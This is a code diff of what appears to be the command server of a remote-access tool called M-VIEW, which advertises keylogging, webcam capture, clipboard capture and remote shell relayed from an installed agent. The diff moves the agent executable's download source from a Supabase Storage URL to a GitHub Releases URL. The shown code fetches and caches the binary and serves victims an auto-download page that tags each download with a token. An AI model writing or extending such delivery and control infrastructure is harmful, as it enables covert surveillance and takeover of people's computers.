@@ -4,7 +4,7 @@
 ║         Render-Ready • Globally Durable • Full Feature Set       ║
 ║                                                                  ║
 ║  WHAT'S NEW IN v5.0:                                             ║
-║  • Agent fetched from Supabase Storage URL (no local bin/)       ║
+║  • Agent fetched from GitHub Releases URL (no local bin/)        ║
 ║  • Streaming-safe: large binary streamed, not buffered           ║
 ║  • All agent features relayed: webcam, clipboard, keylog, shell  ║
 ║  • cursor_event relay added (real-time cursor overlay)           ║
@@ -75,10 +75,10 @@ TABLE         = os.environ.get("SB_TABLE",     "devices")
 PORT          = int(os.environ.get("PORT", 5000))
 VERSION       = "5.0.0"
 
-# Agent is hosted in Supabase Storage — no local bin/ needed on Render
+# Agent is hosted on GitHub Releases — no local bin/ needed on Render
 AGENT_STORAGE_URL = os.environ.get(
     "AGENT_STORAGE_URL",
-    "https://iacdzpcoftxxcoigopun.supabase.co/storage/v1/object/public/agents/master_agent.exe"
+    "https://github.com/maxwelnkaranja-ops/mview/releases/latest/download/master_agent_v4_HEAVY.exe"
 )
 # Optional: local fallback path (used when running locally with a built .exe)
 AGENT_DIR   = os.environ.get("AGENT_DIR",  "bin")
@@ -138,7 +138,7 @@ else:
 _devices:   dict = {}
 _dev_lock          = threading.Lock()
 
-# ── Cached agent binary from Supabase Storage ──────────────────
+# ── Cached agent binary from GitHub Releases ──────────────────────
 _agent_cache: bytes | None = None
 _agent_cache_ts: float     = 0.0
 _agent_cache_lock          = threading.Lock()
@@ -221,7 +221,7 @@ def db_list_all() -> list:
 # ══════════════════════════════════════════════════════════════
 def _fetch_agent_bytes() -> bytes | None:
     """
-    Fetch master_agent.exe — tries Supabase Storage URL first,
+    Fetch master_agent.exe — tries GitHub Releases URL first,
     then falls back to local bin/master_agent.exe.
     Result is cached for AGENT_CACHE_TTL seconds.
     """
@@ -232,10 +232,10 @@ def _fetch_agent_bytes() -> bytes | None:
         if _agent_cache and (now - _agent_cache_ts) < AGENT_CACHE_TTL:
             return _agent_cache
 
-        # 1️⃣  Try Supabase Storage (primary — works on Render with no local files)
+        # 1️⃣  Try GitHub Releases (primary — works on Render with no local files)
         if REQUESTS_OK and AGENT_STORAGE_URL:
             try:
-                log.info(f"Fetching agent from Supabase Storage: {AGENT_STORAGE_URL}")
+                log.info(f"Fetching agent from GitHub Releases: {AGENT_STORAGE_URL}")
                 resp = _requests.get(AGENT_STORAGE_URL, timeout=60)
                 if resp.status_code == 200 and len(resp.content) > 10_000:
                     _agent_cache    = resp.content
@@ -674,13 +674,13 @@ def serve_agent(token):
         "downloaded_at": utcnow(),
         "user_agent":    request.headers.get("User-Agent", "")[:200],
     })
-    log.info(f"Agent download: token={token}  redirecting to Supabase Storage")
+    log.info(f"Agent download: token={token}  redirecting to GitHub Releases")
 
     # Serve a self-extracting HTML page that immediately starts download
-    # from Supabase Storage and embeds the token so the agent can read it.
+    # from GitHub Releases and embeds the token so the agent can read it.
     # The agent reads its token from the filename pattern mview_agent_TOKEN.exe
     srv = request.host_url.rstrip("/")
-    download_url = AGENT_STORAGE_URL  # direct Supabase public URL
+    download_url = AGENT_STORAGE_URL  # GitHub Releases direct URL
 
     html = f"""<!DOCTYPE html>
 <html lang="en">
@@ -1390,14 +1390,14 @@ if SOCKETIO_OK and sio:
 # ══════════════════════════════════════════════════════════════
 def startup():
     log.info("=" * 65)
-    log.info(f"  M-VIEW Server  v{VERSION}  (Render-ready + Supabase Storage)")
+    log.info(f"  M-VIEW Server  v{VERSION}  (Render-ready + GitHub Releases)")
     log.info("=" * 65)
     local = Path(AGENT_DIR) / AGENT_FILE
     if local.is_file():
         log.info(f"  ✓ Agent (local):    {local}  ({local.stat().st_size:,} bytes)")
     else:
-        log.info(f"  — Agent (local):    not found — using Supabase Storage")
-    log.info(f"  ✓ Agent (storage):  {AGENT_STORAGE_URL}")
+        log.info(f"  — Agent (local):    not found — using GitHub Releases")
+    log.info(f"  ✓ Agent (github):  {AGENT_STORAGE_URL}")
     log.info(f"  ✓ Supabase:         {SUPABASE_URL[:55]}")
     log.info(f"  ✓ SocketIO:         {'yes — gevent' if SOCKETIO_OK else 'NO'}")
     log.info(f"  ✓ Port:             {PORT}")
